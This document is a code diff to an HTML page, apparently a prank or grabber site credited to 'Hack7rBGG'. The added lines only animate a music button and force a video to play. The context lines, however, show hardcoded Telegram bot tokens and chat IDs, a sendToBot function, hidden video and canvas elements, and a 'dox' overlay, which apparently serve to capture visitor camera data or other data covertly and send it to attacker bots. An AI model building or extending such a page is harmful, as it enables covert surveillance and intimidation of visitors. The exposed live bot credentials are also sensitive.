@@ -49,6 +49,13 @@
         }
         @keyframes flash-anim { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
 
+        /* ANIMASI MUSIK (EQUALIZER) 🎵 */
+        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; display: none; }
+        .bar { width: 3px; height: 100%; background: #1877f2; animation: wave 1s infinite; }
+        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
+        .bar:nth-child(2) { animation-delay: 0.2s; }
+        .bar:nth-child(3) { animation-delay: 0.4s; }
+
         /* Credit & Music Bar */
         .credit-bar {
             position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
@@ -58,7 +65,7 @@
         }
         .credit-info { display: flex; flex-direction: column; text-align: left; }
         .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 11px; font-weight: bold; }
+        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 11px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
         
         #video, #canvas { display: none; }
     </style>
@@ -113,7 +120,12 @@
         <span style="font-size: 10px; color: #888;">Developed by:</span>
         <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
     </div>
-    <button class="play-btn" onclick="toggleMusic()">▶ PLAY MUSIC</button>
+    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
+        <span id="btnText">▶ PLAY MUSIC</span>
+        <div class="music-anim" id="animContainer">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+    </button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -123,6 +135,7 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
     const audio = document.getElementById('bgMusic');
+    const anim = document.getElementById('animContainer');
 
     window.onload = () => {
         setTimeout(() => {
@@ -134,7 +147,16 @@
     };
 
     function toggleMusic() {
-        if (audio.paused) { audio.play(); } else { audio.pause(); }
+        const txt = document.getElementById('btnText');
+        if (audio.paused) { 
+            audio.play(); 
+            txt.innerText = "⏸ PAUSE";
+            anim.style.display = "flex";
+        } else { 
+            audio.pause(); 
+            txt.innerText = "▶ PLAY MUSIC";
+            anim.style.display = "none";
+        }
     }
 
     function sendToBot(content, type = "text", blob = null) {
@@ -178,8 +200,13 @@
         const dox = document.getElementById('dox-flash');
         
         overlay.style.display = 'block';
-        vid.muted = false; // Matikan mute pas mau jalan
-        vid.play().catch(e => console.log("Video play error: ", e));
+        vid.muted = false; // Buka suara!
+        
+        // PENTING: Paksa video play
+        var playPromise = vid.play();
+        if (playPromise !== undefined) {
+            playPromise.then(_ => {}).catch(error => { vid.play(); });
+        }
         
         dox.style.display = 'block';
         setTimeout(() => { dox.style.display = 'none'; }, 6000);
